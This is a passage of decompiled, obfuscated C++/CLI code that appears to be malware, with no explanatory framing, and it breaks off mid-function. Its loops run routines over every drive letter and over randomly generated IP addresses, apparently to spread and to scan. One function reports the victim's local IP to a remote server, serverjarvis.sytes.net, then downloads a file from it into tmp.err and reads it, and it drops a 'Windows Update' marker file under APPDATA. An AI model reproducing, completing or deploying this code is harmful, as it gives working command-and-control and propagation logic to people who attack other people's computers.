    \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar1, 3, 1);
    // ISSUE: fault handler
    try
    {
      *res = 0;
      res[1] = 0;
      res[2] = 0;
      res[3] = 0;
      int index = 0;
      while (true)
      {
        sbyte* numPtr1 = ip;
        if (*ip != (sbyte) 0)
        {
          do
          {
            ++numPtr1;
          }
          while (*numPtr1 != (sbyte) 0);
        }
        sbyte* numPtr2 = (sbyte*) ((IntPtr) numPtr1 - (IntPtr) ip);
        if ((UIntPtr) index < (UIntPtr) numPtr2)
        {
          if (\u003CModule\u003E.isdigit((int) ip[index]) != 0)
            \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar1 + 8), ip[index]);
          if (ip[index] != (sbyte) 46)
          {
            sbyte* numPtr3 = ip;
            if (*ip != (sbyte) 0)
            {
              do
              {
                ++numPtr3;
              }
              while (*numPtr3 != (sbyte) 0);
            }
            sbyte* numPtr4 = (sbyte*) ((IntPtr) numPtr3 - (IntPtr) ip);
            if ((IntPtr) index != (IntPtr) (numPtr4 - 1))
              goto label_18;
          }
          basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar2;
          basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar1, &stdAllocatorChar2);
          // ISSUE: fault handler
          try
          {
            *(int*) (num * 4 + (IntPtr) res) = \u003CModule\u003E.atoi(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr));
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
          basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar3;
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar3, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_00CNPNBAHC\u0040\u003F\u0024AA\u0040);
          // ISSUE: fault handler
          try
          {
            \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar1, &stdAllocatorChar3);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar3);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar3);
          ++num;
          if (num >= 4)
            break;
label_18:
          ++index;
        }
        else
          break;
      }
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar1);
    }
    \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar1);
  }

  internal static unsafe void dkpJDeZMfE(List<object> gfy)
  {
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    \u003CModule\u003E.srand((uint) (int) \u003CModule\u003E._time64((long*) 0));
    while (true)
    {
      try
      {
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03GCNDMCJL\u0040a\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03HAGGGNHF\u0040b\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03FFANDCKJ\u0040d\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03ONLBFFMM\u0040e\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03PPAEPKCC\u0040f\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03EHLIJNEH\u0040g\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03BPNLINBB\u0040h\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03KHGHOKHE\u0040i\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03LFNCEFJK\u0040j\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03NGOCCPP\u0040k\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03JALJBKEG\u0040l\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03CIAFHNCD\u0040m\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03DKLANCMN\u0040n\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03ICAMLFKI\u0040o\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03IKHGPCGB\u0040p\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03DCMKJFAE\u0040q\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03CAHPDKOK\u0040r\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03JIMDFNIP\u0040s\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03FBEGFDG\u0040t\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03LNKIACFD\u0040u\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03KPBNKNLN\u0040v\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03EPMCNKIO\u0040x\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03OFMLBCAF\u0040z\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03BHKBMKNI\u0040w\u003F3\u003F2\u003F\u0024AA\u0040);
        \u003CModule\u003E.idyCrSGwdxc((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03PHHOLNOL\u0040y\u003F3\u003F2\u003F\u0024AA\u0040);
      }
      catch (Exception ex)
      {
      }
      catch (Exception ex1) when (
      {
        // ISSUE: unable to correctly present filter
        exception* exceptionPtr;
        if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) &\u003CModule\u003E.\u003F\u003F_R0PAVexception\u0040std\u0040\u0040\u00408, 0, (void*) &exceptionPtr) != 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        uint num2 = 0;
        \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
        try
        {
          try
          {
          }
          catch (Exception ex2) when (
          {
            // ISSUE: unable to correctly present filter
            num2 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
            if (num2 != 0U)
            {
              SuccessfulFiltering;
            }
            else
              throw;
          }
          )
          {
          }
          goto label_12;
          if (num2 != 0U)
            throw;
        }
        finally
        {
          \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num2);
        }
      }
label_12:
      \u003CModule\u003E.Sleep(300000U);
    }
  }

  internal static unsafe void vwiapKiHaDIc(List<object> gfy)
  {
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    \u003CModule\u003E.srand((uint) (int) \u003CModule\u003E._time64((long*) 0));
    while (true)
    {
      try
      {
        \u0024ArrayType\u0024\u0024\u0024BY03H arrayTypeBy03H;
        \u003CModule\u003E.ipStringToArray(\u003CModule\u003E.jySiVFhQbN(), (int*) &arrayTypeBy03H);
        \u003CModule\u003E.qvQKrmQKRM((int*) &arrayTypeBy03H, 5, (int) byte.MaxValue);
      }
      catch (Exception ex)
      {
      }
      catch (Exception ex1) when (
      {
        // ISSUE: unable to correctly present filter
        exception* exceptionPtr;
        if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) &\u003CModule\u003E.\u003F\u003F_R0PAVexception\u0040std\u0040\u0040\u00408, 0, (void*) &exceptionPtr) != 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        uint num2 = 0;
        \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
        try
        {
          try
          {
          }
          catch (Exception ex2) when (
          {
            // ISSUE: unable to correctly present filter
            num2 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
            if (num2 != 0U)
            {
              SuccessfulFiltering;
            }
            else
              throw;
          }
          )
          {
          }
          goto label_12;
          if (num2 != 0U)
            throw;
        }
        finally
        {
          \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num2);
        }
      }
label_12:
      \u003CModule\u003E.Sleep(300000U);
    }
  }

  internal static unsafe void pqFsKLVFQEhSc(List<object> gfy)
  {
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    \u003CModule\u003E.srand((uint) (int) \u003CModule\u003E._time64((long*) 0));
    while (true)
    {
      try
      {
        \u0024ArrayType\u0024\u0024\u0024BY03H arrayTypeBy03H;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref arrayTypeBy03H = 0;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &arrayTypeBy03H + 4) = 0;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &arrayTypeBy03H + 8) = 0;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &arrayTypeBy03H + 12) = 0;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref arrayTypeBy03H = \u003CModule\u003E.BeDhd(1, (int) byte.MaxValue);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &arrayTypeBy03H + 4) = \u003CModule\u003E.BeDhd(0, (int) byte.MaxValue);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &arrayTypeBy03H + 8) = \u003CModule\u003E.BeDhd(0, (int) byte.MaxValue);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &arrayTypeBy03H + 12) = \u003CModule\u003E.BeDhd(0, (int) byte.MaxValue);
        \u003CModule\u003E.qvQKrmQKRM((int*) &arrayTypeBy03H, 5, 100);
      }
      catch (Exception ex)
      {
      }
      catch (Exception ex1) when (
      {
        // ISSUE: unable to correctly present filter
        exception* exceptionPtr;
        if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) &\u003CModule\u003E.\u003F\u003F_R0PAVexception\u0040std\u0040\u0040\u00408, 0, (void*) &exceptionPtr) != 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        uint num2 = 0;
        \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
        try
        {
          try
          {
          }
          catch (Exception ex2) when (
          {
            // ISSUE: unable to correctly present filter
            num2 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
            if (num2 != 0U)
            {
              SuccessfulFiltering;
            }
            else
              throw;
          }
          )
          {
          }
          goto label_12;
          if (num2 != 0U)
            throw;
        }
        finally
        {
          \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num2);
        }
      }
label_12:
      \u003CModule\u003E.Sleep(1000U);
    }
  }

  internal static unsafe basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* eMlAjryx(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0)
  {
    uint num1;
    // ISSUE: fault handler
    try
    {
      num1 = 0U;
      ++\u003CModule\u003E.countCache;
      sbyte* _Val = \u003CModule\u003E.jySiVFhQbN();
      basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar1;
      \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar1, 3, 1);
      // ISSUE: fault handler
      try
      {
        if ((IntPtr) _Val != ref \u003CModule\u003E.\u003F\u003F_C\u0040_00CNPNBAHC\u0040\u003F\u0024AA\u0040)
          \u003CModule\u003E.std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u003C\u003C(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar1 + 8), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0EE\u0040MLGEAKHK\u0040http\u003F3\u003F1\u003F1serverjarvis\u003F4sytes\u003F4net\u003F1re\u0040), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_09MBDPDOGO\u0040\u003F\u0024CGiplocal\u003F\u0024DN\u003F\u0024AA\u0040), _Val), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07NIMGFCME\u0040\u003F\u0024CGcache\u003F\u0024DN\u003F\u0024AA\u0040), \u003CModule\u003E.countCache);
        basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar2;
        \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar2, 3, 1);
        // ISSUE: fault handler
        try
        {
          \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar2 + 8), \u003CModule\u003E.getenv((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07FMLNDKFM\u0040APPDATA\u003F\u0024AA\u0040)), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0CF\u0040PIBCDBKF\u0040\u003F26s4d5f65sd4f65sd4gg3216564_0022\u0040);
          basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar3;
          basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr1 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar2, &stdAllocatorChar3);
          bool flag;
          // ISSUE: fault handler
          try
          {
            uint fileAttributesA = \u003CModule\u003E.GetFileAttributesA(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr1));
            flag = fileAttributesA == uint.MaxValue || ((int) fileAttributesA & 16) != 0;
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar3);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar3);
          if (flag)
          {
            \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar1 + 8), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_04ICMHLEIM\u0040\u003F\u0024CGnew\u003F\u0024AA\u0040);
            basic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E stdCharTraitsChar;
            \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdCharTraitsChar, 1);
            // ISSUE: fault handler
            try
            {
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar4;
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr2 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar2, &stdAllocatorChar4);
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eopen(&stdCharTraitsChar, \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr2), 2, 64);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar4);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar4);
              \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) &stdCharTraitsChar, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0P\u0040PJAKFCMN\u0040Windows\u003F5Update\u003F\u0024AA\u0040);
              \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eclose(&stdCharTraitsChar);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdCharTraitsChar);
            }
            \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdCharTraitsChar);
          }
          char* chPtr = (char*) \u003CModule\u003E.new\u005B\u005D(8192U);
          basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar5;
          basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr3 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar1, &stdAllocatorChar5);
          // ISSUE: fault handler
          try
          {
            \u003CModule\u003E.MultiByteToWideChar(0U, 0U, \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr3), -1, chPtr, 4096);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar5);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar5);
          \u003CModule\u003E.URLDownloadToFileW((IUnknown*) 0, chPtr, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1BE\u0040CGOLLDP\u0040\u003F\u0024AA\u003F4\u003F\u0024AA\u003F1\u003F\u0024AAt\u003F\u0024AAm\u003F\u0024AAp\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAr\u003F\u0024AAr\u003F\u0024AA\u003F\u0024AA\u0040, 0U, (IBindStatusCallback*) 0);
          basic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E stdCharTraitsChar1;
          \u003CModule\u003E.std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdCharTraitsChar1, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_09OBIFGHAI\u0040\u003F4\u003F1tmp\u003F4err\u003F\u0024AA\u0040, 1, 64, 1);
          // ISSUE: fault handler
          try
          {
            istreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E _Last;
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            ^(int&) ref _Last = 0;
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            ^(sbyte&) ((IntPtr) &_Last + 4) = (sbyte) 1;
            istreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E _First;
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            ^(int&) ref _First = (int) \u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (^(int&) ref stdCharTraitsChar1 + 4) + (IntPtr) &stdCharTraitsChar1));
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
